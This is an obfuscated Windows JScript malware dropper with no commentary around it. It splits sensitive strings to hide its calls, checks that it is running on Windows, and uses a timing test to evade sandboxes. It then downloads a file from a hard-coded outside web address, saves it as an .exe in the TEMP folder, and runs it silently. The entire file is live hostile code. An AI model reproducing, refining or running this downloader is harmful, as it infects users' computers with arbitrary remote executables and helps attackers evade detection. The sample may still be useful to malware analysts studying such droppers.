var WW = false;
var M0 = "Create"+"Object";
var L = function G() {return WScript[M0]("WScript"+".Shell");}(), A = 11;
var WZ = "MSXML2"+".XMLHTTP";
var IX = 2;
var EA = IX - 2;
function F(PR){L["Run"](PR, EA, EA);};
function SC(){return WZ + "";};
function P(EN, T){EA = EA * 1; return EN - T;};
function G0(){return M0;};
/*@cc_on
  @if (@_win32 || @_win64)
    WW = true;
  @end
@*/
if (WW)
{
var XC = "";
function I(){return 22;};
var JR = 0; var JY = 0;
function FJ()
{
var R0 = new this["Date"]();
var S = R0["getUTCMilliseconds"]();
WScript["Sleep"](I());
var R0 = new this["Date"]();
var M1 = R0["getUTCMilliseconds"]();
WScript["Sleep"](I());
var R0 = new this["Date"]();
var Y = R0["getUTCMilliseconds"]();
var JR = "VG";
JR = P(M1, S);
var JY = "DH";
JY = P(Y, M1);
XC = "open";
return P(JR, JY);
}
var NH = false;
var ZX = false;
for (var SZ = EA; SZ < I() * 1; SZ++){if (FJ() != EA){
NH = true; 
JY = "31" + 11 * JR + JY; 
ZX = true; 
break;
}}
function C() {return ((NH == true) && (NH == ZX)) ? 1 : EA;};
if (NH && C() && ZX){
function M() {return L["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "f1z6uXlS.ex" + "e";};
 D = SC();
 MX = WScript[M0](D);
 var E = 1;
do { 
	for (;E;){
	try {
		if (E == 1)
		{
			MX[XC]("GET", "http://aaacollectionsjewelry.com/x9djsa", false);
			MX["send"]();
			R = "Sleep";
			E = 2;
		}
		WScript[R](I() + 120); 
		if (MX["readystate"] < 2 * 2) continue;
		E = EA;
		function PJ(I0) {var U = (1, 2, 3, 4, 5, I0); return U;};
		W = WScript[G0()]("ADODB.Stream");
		D = W;
		D[XC]();
		D["type"] = PJ(1);
		D["write"](MX["ResponseBody"]);
		W["position"] = PJ(EA);
		D["Save" + "ToFile"](M(), 2);
		W["cl"+"ose"]();
		F0 = M();
		F(F0);
	} catch(B){};};
}while (E);
}
}

